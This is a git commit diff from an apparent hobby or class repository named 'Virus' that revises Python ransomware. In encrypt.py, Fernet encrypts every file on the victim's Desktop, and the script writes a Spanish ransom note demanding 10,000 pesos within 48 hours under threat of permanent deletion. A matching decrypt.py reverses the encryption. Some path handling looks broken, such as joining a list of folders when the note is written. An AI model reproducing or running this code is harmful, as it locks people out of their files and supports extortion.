ea6d439254a59affad628ed232cac69dfe2d37af
David Castillo Téllez <39785225+Saladito19@users.noreply.github.com>
2024-05-24 12:53:43 -0500

    Listo

--- Virus/decrypt.py
+++ Virus/decrypt.py
@@ -16,16 +16,11 @@ def decryp(items, key):
 
 if __name__ == "__main__":
     user_profile = os.getenv('USERPROFILE')
-    archivos = os.path.join(user_profile, 'Desktop')
+    archivos = 'C:\\Users\\'+user_profile+'\\Desktop'
     os.remove(archivos+"\\"+"readme.txt")
     items = os.listdir(archivos)
-    archivos_2 = [os.path.join(archivos, x) for x in items]
-
-    archivos_3 = os.path.join(user_profile, 'Desktop')
-    os.remove(archivos_3+"\\"+"readme.txt")
-    items = os.listdir(archivos_3)
-    archivos_4 = [os.path.join(archivos_3, x) for x in items]
+    archivos_2 = [archivos+'\\'+x for x in items]
+    
 
 key = retornarKey()
 decryp(archivos_2,key)
-decryp(archivos_4,key)
--- Virus/encrypt.py
+++ Virus/encrypt.py
@@ -1,5 +1,6 @@
 from cryptography.fernet import Fernet
 import os
+import glob
 
 def generarKey():
     key = Fernet.generate_key()
@@ -19,31 +20,36 @@ def encryp(items, key):
         with open(x, "wb") as file:
             file.write(data)
 
+# if __name__ == "__main__":
+#     user_profile = os.getenv('USERPROFILE')
+#     archivos = os.path.join(user_profile, 'Desktop')
+#     items = os.listdir(archivos)
+#     archivos_2 = [os.path.join(archivos, x) for x in items]
+
+#     generarKey()
+#     key = retornarKey()
+
+#     encryp(archivos_2, key)
+
 if __name__ == "__main__":
     user_profile = os.getenv('USERPROFILE')
-    archivos = os.path.join(user_profile, 'Desktop')
-    items = os.listdir(archivos)
-    archivos_2 = [os.path.join(archivos, x) for x in items]
+    desktop_path = os.path.join(user_profile, 'Desktop')
 
-    archivos_3 = os.path.join(user_profile, 'Documents')
-    items = os.listdir(archivos_3)
-    archivos_4 = [os.path.join(archivos_3, x) for x in items]
+    # Obtener todas las carpetas dentro del escritorio
+    carpetas = glob.glob(os.path.join(desktop_path, '*'))
+
+    # Filtrar para obtener solo las carpetas (excluyendo archivos)
+    carpetas = [carpeta for carpeta in carpetas if os.path.isdir(carpeta)]
+
+    # También puedes incluir archivos si es necesario
+    archivos_2 = glob.glob(os.path.join(desktop_path, '*'))
 
     generarKey()
     key = retornarKey()
 
     encryp(archivos_2, key)
-    encryp(archivos_4, key)
 
-    with open(os.path.join(archivos, "readme.txt"), "w") as file:
-        file.write("TODOS SUS ARCHIVOS HAN SIDO ENCRIPTADOS.\n")
-        file.write("PARA RECUPERARLOS, DEPOSITE $10,000 PESOS A LA SIGUIENTE CUENTA:\n")
-        file.write("Cuenta: XXXXXXXXXX\n")
-        file.write("SI NO REALIZA EL PAGO EN 48 HORAS, TODOS SUS ARCHIVOS SERÁN ELIMINADOS PERMANENTEMENTE.\n")
-        file.write("NO INTENTE DESENCRIPTAR LOS ARCHIVOS POR SU CUENTA, CUALQUIER INTENTO FALLIDO RESULTARÁ EN LA PÉRDIDA PERMANENTE DE SUS DATOS.\n")
-        file.write("ESTE ES SU ÚLTIMO AVISO.\n")
-    
-    with open(os.path.join(archivos_4, "readme.txt"), "w") as file:
+    with open(os.path.join(carpetas, "readme.txt"), "w") as file:
         file.write("TODOS SUS ARCHIVOS HAN SIDO ENCRIPTADOS.\n")
         file.write("PARA RECUPERARLOS, DEPOSITE $10,000 PESOS A LA SIGUIENTE CUENTA:\n")
         file.write("Cuenta: XXXXXXXXXX\n")
